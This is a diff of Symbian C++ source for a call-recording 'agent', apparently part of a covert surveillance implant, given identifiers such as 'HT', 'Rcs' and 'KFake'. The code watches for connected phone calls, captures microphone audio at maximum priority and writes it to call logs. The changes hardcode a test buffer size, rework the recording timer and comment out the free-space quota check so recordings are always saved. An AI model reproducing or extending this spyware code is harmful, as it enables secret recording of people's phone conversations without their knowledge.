@@ -6,6 +6,7 @@
  */
 
 #include "AgentCallLocal.h"
+#include <e32base.h>
 #include <HT\TimeUtils.h>
 
 // Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
@@ -18,7 +19,7 @@ _LIT8(KFake,"\xff\xff\xff\xff");
 _LIT(KLocal,"Local");
 
 CAgentCallLocal::CAgentCallLocal() :
-CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady)
+CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecInterval(400000)
 	{
 	// No implementation required
 	}
@@ -26,7 +27,7 @@ CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady)
 CAgentCallLocal::~CAgentCallLocal()
 	{
 	delete iCallMonitor;
-	delete iTimer;
+	//delete iTimer;
 	
 	if(iInputStream)
 	    {
@@ -64,12 +65,13 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 	
 	TUint8* ptr = (TUint8 *)iParams.Ptr();
 	Mem::Copy( &iBuffSize, ptr, 4);
+	iBuffSize=8000;  //TODO: just for test, delete when done 
 	ptr += 4;
 	Mem::Copy(&iCompression,ptr,4 );
 	
 	
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
-	iTimer = CTimeOutTimer::NewL(*this);
+	//iTimer = CHighResTimeoutTimer::NewL(*this); //EPriorityUserInput,EPriorityHigh
 		
 	// Initial audio stream properties for input and output, 8KHz mono. 
 	// These settings could also be set/changed using method SetAudioPropertiesL() of
@@ -81,7 +83,7 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 	// construct stream
 	// priorities will be ignored if the capability MultimediaDD isn't provided,
 	// priority taken from mmfbase.h
-    iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTimeAndQuality);
+    iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTime); //EMdaPriorityPreferenceTimeAndQuality
 		    			
     // stream buffers allocation
     TDes8* buffer;
@@ -134,7 +136,7 @@ void CAgentCallLocal::StartAgentCmdL()
 		}
 		
 	// priorities will be ignored if the capability MultimediaDD isn't provided
-	iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTimeAndQuality);
+	iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTime); //EMdaPriorityPreferenceTime
 		    
 	// Open input stream.
 	// Upon completion will receive callback in 
@@ -146,7 +148,7 @@ void CAgentCallLocal::StartAgentCmdL()
 void CAgentCallLocal::StopAgentCmdL()
 	{
 	
-	iTimer->Cancel();
+	//iTimer->Cancel();
 	iCallMonitor->Cancel();
 	
 	if(iInputStream)
@@ -156,10 +158,6 @@ void CAgentCallLocal::StopAgentCmdL()
 	
 	}
 
-void CAgentCallLocal::NotifyAgentCmdL(TUint32 aData)
-	{
-	
-	}
 
 /*
  * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
@@ -248,14 +246,14 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 				iVoiceAdditionalData.highStopTime = (filetime >> 32);
 				iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
 				//we have to write log
-				if(!iBelowFreespaceQuota)
-					{
+				//if(!iBelowFreespaceQuota)
+					//{
 					CLogFile* logFile = CLogFile::NewLC(iFs);
 					logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
 					logFile->AppendLogL(*iRecData);
 					logFile->CloseLogL();
 					CleanupStack::PopAndDestroy(logFile);
-					}
+					//}
 				iVoiceAdditionalData.highStartTime = (filetime >> 32);
 				iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
 				// ...reset buffer 
@@ -276,14 +274,14 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 			iVoiceAdditionalData.highStopTime = (filetime >> 32);
 			iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
 					
-			if(!iBelowFreespaceQuota)
-				{
+			//if(!iBelowFreespaceQuota)
+				//{
 				CLogFile* logFile = CLogFile::NewLC(iFs);
 				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
 				logFile->AppendLogL(*iRecData);
 				logFile->CloseLogL();
 				CleanupStack::PopAndDestroy(logFile);
-				}
+				//}
 			iVoiceAdditionalData.highStartTime = (filetime >> 32);
 			iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
 						
@@ -380,6 +378,9 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 			{
 			iInputStream->ReadL(*iStreamBufferArray[0]);
 			iInputStream->ReadL(*iStreamBufferArray[1]);
+			
+			//iTimer->RcsHighRes(iMicrosecInterval);
+				
 			}
 		}
 	}
@@ -387,6 +388,7 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 void CAgentCallLocal::NotifyDisconnectedCallStatusL()
 	{
 	iInCall = EFalse;
+	//iTimer->Cancel();
 	iInputStream->Stop();
 	//WriteFakeLogL();
 	}
@@ -397,8 +399,15 @@ void CAgentCallLocal::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection 
 	
 	}
 
-void CAgentCallLocal::TimerExpiredL(TAny* src)
+void CAgentCallLocal::HighResTimerExpiredL(TAny* src)
 	{
+	iInputStream->Stop();
+	
+	iInputStream->ReadL(*iStreamBufferArray[0]);
+	iInputStream->ReadL(*iStreamBufferArray[1]);
+				
+	//iTimer->RcsHighRes(iMicrosecInterval);
+				
 	}
 
 
